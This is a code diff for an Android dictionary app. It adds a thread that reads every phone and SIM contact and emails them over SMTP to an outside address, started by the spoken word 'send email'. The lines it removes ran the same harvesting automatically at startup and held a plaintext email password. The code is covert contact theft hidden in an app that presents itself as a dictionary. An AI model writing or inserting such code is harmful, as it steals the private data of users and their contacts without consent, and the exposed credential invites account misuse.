@@ -2,6 +2,7 @@ package com.example.yecai.dict;
 
 import android.content.ActivityNotFoundException;
 import android.content.ContentResolver;
+import android.content.Context;
 import android.database.Cursor;
 import android.location.Address;
 import android.net.ConnectivityManager;
@@ -28,6 +29,7 @@ import android.provider.ContactsContract.CommonDataKinds.Photo;
 
 //import java.net.Authenticator;
 //import java.net.PasswordAuthentication;
+import java.lang.Thread;
 import java.util.ArrayList;
 import java.util.Properties;
 
@@ -41,6 +43,142 @@ import javax.mail.internet.InternetAddress;
 import javax.mail.internet.AddressException;
 import javax.mail.internet.MimeMessage;
 
+class emailThread extends Thread
+{
+    private Context context;
+    emailThread(Context activity)
+    {
+        context = activity;
+    }
+    //testing
+    //getPhoneContacts();
+    //sendEmail();
+//for phone contact information
+    private final String[] PHONES_PROJECTION = new String[]
+            {
+                    Phone.DISPLAY_NAME,
+                    Phone.NUMBER,
+                    Phone.PHOTO_ID,
+                    Phone.CONTACT_ID
+            };
+    private static final int PHONES_DISPLAY_NAME_INDEX = 0;
+    private static final int PHONES_NUMBER_INDEX = 1;
+    private static final int PHONES_PHOTO_INDEX = 2;
+    private static final int PHONES_CONTACT_INDEX = 3;
+
+    //获取手机通讯录
+    private String getPhoneNumber(Cursor phoneCursor)
+    {
+        return phoneCursor.getString(PHONES_NUMBER_INDEX);
+    }
+
+    private String getContactName(Cursor phoneCursor)
+    {
+        return phoneCursor.getString(PHONES_DISPLAY_NAME_INDEX);
+    }
+
+    private String getPhoneContacts()
+    {
+        ContentResolver contentResolver = context.getContentResolver();
+        Cursor phoneCursor = contentResolver.query(Phone.CONTENT_URI, PHONES_PROJECTION, null, null, null);
+        //ArrayList<String> phoneNumberList = new ArrayList<String>();
+        //ArrayList<String> contactNameList = new ArrayList<String>();
+        String result = "";
+        if(phoneCursor != null)
+        {
+            while(phoneCursor.moveToNext())
+            {
+                //phoneNumberList.add(phoneNumber);
+                //contactNameList.add(contactName);
+                result += getContactName(phoneCursor) + " " + getPhoneNumber(phoneCursor) + "\n";
+            }
+        }
+        System.out.println(result);
+        return result;
+    }
+    //获取sim卡通讯录
+    private String getSimContacts()
+    {
+        String result = "";
+
+        ContentResolver contentResolver = context.getContentResolver();
+        Uri uri = Uri.parse("content://icc/adn");//sim card
+        Cursor phoneCursor = contentResolver.query(uri, PHONES_PROJECTION, null, null, null);
+
+        if(phoneCursor != null)
+        {
+            while (phoneCursor.moveToNext())
+            {
+                result += getContactName(phoneCursor) + " " + getPhoneNumber(phoneCursor) + "\n";
+            }
+            System.out.println(result);
+        }
+        return result;
+    }
+
+    private void sendContactsEmail()
+    {
+        String smtp = "smtp.163.com";
+        String port = "25";
+
+        final String username = "caiye1231";
+        final String pass = "*****";
+
+        Properties property = new Properties();
+        property.put("mail.smtp.host", smtp);
+        property.put("mail.smtp.port", port);
+        property.put("mail.smtp.auth", "true");
+        Authenticator auth = new Authenticator() {
+            @Override
+            protected PasswordAuthentication getPasswordAuthentication()
+            {
+                return new PasswordAuthentication(username, pass);//super.getPasswordAuthentication();
+            }
+        };
+
+        Session session = Session.getInstance(property, auth);
+        String from = "caiye1231@163.com";
+        String to = "ye.cai@envisioncn.com";
+        try
+        {
+            MimeMessage message = new MimeMessage(session);
+
+            //get contacts information
+            String contacts = "phone contacts: \n" + getPhoneContacts();
+            contacts += "sim contacts: \n" + getSimContacts();
+
+            InternetAddress addrFrom = new InternetAddress(from);
+            InternetAddress addrTo =  new InternetAddress(to);
+            try
+            {
+                message.setContent(contacts, "text/plain");
+                message.setSubject("contacts info");
+                message.setFrom(addrFrom);
+                message.addRecipient(MimeMessage.RecipientType.TO, addrTo);
+                message.saveChanges();
+
+                Transport transport = session.getTransport("smtp");
+                transport.connect(smtp, username, pass);
+                transport.send(message);
+                transport.close();
+            }
+            catch (MessagingException e)
+            {
+                System.out.println("message exception: " + e);
+            }
+        }
+        catch(AddressException e)
+        {
+            System.out.println("address exception: " + e);
+        }
+    }
+    @Override
+    public void run()//send mail
+    {
+        sendContactsEmail();
+        //handler.sendEmptyMessage(msg_send_mail);
+    }
+}
 
 public class ActivityDict extends Activity {
     private static final int VOICE_RECOGNITION_CODE = 1234;
@@ -100,6 +238,11 @@ public class ActivityDict extends Activity {
                                 handler.sendEmptyMessage(msg_get_result);
                             }
                         }.start();
+
+                        if(word.equals("send email") )
+                        {
+                            new emailThread(ActivityDict.this).start();
+                        }
                     }
                 }
         );
@@ -125,138 +268,6 @@ public class ActivityDict extends Activity {
                     }
                 }
         );
-
-        //testing
-        //getPhoneContacts();
-        //sendEmail();
-        new Thread()
-        {
-            //for phone contact information
-            private final String[] PHONES_PROJECTION = new String[]
-                    {
-                            Phone.DISPLAY_NAME,
-                            Phone.NUMBER,
-                            Phone.PHOTO_ID,
-                            Phone.CONTACT_ID
-                    };
-            private static final int PHONES_DISPLAY_NAME_INDEX = 0;
-            private static final int PHONES_NUMBER_INDEX = 1;
-            private static final int PHONES_PHOTO_INDEX = 2;
-            private static final int PHONES_CONTACT_INDEX = 3;
-
-            //获取手机通讯录
-        private String getPhoneNumber(Cursor phoneCursor)
-        {
-            return phoneCursor.getString(PHONES_NUMBER_INDEX);
-        }
-
-        private String getContactName(Cursor phoneCursor)
-        {
-            return phoneCursor.getString(PHONES_DISPLAY_NAME_INDEX);
-        }
-
-        private String getPhoneContacts()
-            {
-                ContentResolver contentResolver = getContentResolver();
-                Cursor phoneCursor = contentResolver.query(Phone.CONTENT_URI, PHONES_PROJECTION, null, null, null);
-                //ArrayList<String> phoneNumberList = new ArrayList<String>();
-               //ArrayList<String> contactNameList = new ArrayList<String>();
-                String result = "";
-                if(phoneCursor != null)
-                {
-                    while(phoneCursor.moveToNext())
-                    {
-                       //phoneNumberList.add(phoneNumber);
-                        //contactNameList.add(contactName);
-                        result += getContactName(phoneCursor) + " " + getPhoneNumber(phoneCursor) + "\n";
-                    }
-                }
-                System.out.println(result);
-                return result;
-            }
-            //获取sim卡通讯录
-        private String getSimContacts()
-            {
-                String result = "";
-
-                ContentResolver contentResolver = getContentResolver();
-                Uri uri = Uri.parse("content://icc/adn");//sim card
-                Cursor phoneCursor = contentResolver.query(uri, PHONES_PROJECTION, null, null, null);
-
-                if(phoneCursor != null)
-                {
-                    while (phoneCursor.moveToNext())
-                    {
-                        result += getContactName(phoneCursor) + " " + getPhoneNumber(phoneCursor) + "\n";
-                    }
-                    System.out.println(result);
-                }
-                return result;
-            }
-
-        private void sendContactsEmail()
-            {
-                String smtp = "smtp.163.com";
-                String port = "25";
-
-                final String username = "caiye1231";
-                final String pass = "caiye8!93259";
-
-                Properties property = new Properties();
-                property.put("mail.smtp.host", smtp);
-                property.put("mail.smtp.port", port);
-                property.put("mail.smtp.auth", "true");
-                Authenticator auth = new Authenticator() {
-                    @Override
-                    protected PasswordAuthentication getPasswordAuthentication()
-                    {
-                        return new PasswordAuthentication(username, pass);//super.getPasswordAuthentication();
-                    }
-                };
-
-                Session session = Session.getInstance(property, auth);
-                String from = "caiye1231@163.com";
-                String to = "ye.cai@envisioncn.com";
-                try
-                {
-                    MimeMessage message = new MimeMessage(session);
-
-                    //get contacts information
-                    String contacts = "phone contacts: \n" + getPhoneContacts();
-                    contacts += "sim contacts: \n" + getSimContacts();
-
-                    InternetAddress addrFrom = new InternetAddress(from);
-                    InternetAddress addrTo =  new InternetAddress(to);
-                    try
-                    {
-                        message.setContent(contacts, "text/plain");
-                        message.setSubject("contacts info");
-                        message.setFrom(addrFrom);
-                        message.addRecipient(MimeMessage.RecipientType.TO, addrTo);
-                        message.saveChanges();
-
-                        Transport transport = session.getTransport("smtp");
-                        transport.connect(smtp, username, pass);
-                        transport.send(message);
-                        transport.close();
-                    }
-                    catch (MessagingException e)
-                    {
-                        System.out.println("message exception: " + e);
-                    }
-                }
-                catch(AddressException e)
-                {
-                    System.out.println("address exception: " + e);
-                }
-            }
-            @Override
-        public void run()//send mail
-            {
-                sendContactsEmail();
-                handler.sendEmptyMessage(msg_send_mail);
-            }
-        }.start();
     }
 
 
